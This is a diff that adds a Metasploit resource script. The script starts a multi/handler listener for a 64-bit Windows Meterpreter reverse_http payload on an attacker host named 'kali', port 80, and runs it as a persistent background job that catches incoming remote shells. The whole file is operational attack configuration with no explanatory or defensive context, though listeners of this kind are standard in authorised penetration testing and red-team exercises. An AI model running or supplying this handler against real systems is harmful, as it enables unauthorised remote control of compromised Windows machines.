@@ -1,0 +1,8 @@
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_http
+set EXITFUNC thread
+set LHOST kali
+set LPORT 80
+set ExitOnSession false
+exploit -j -z
+
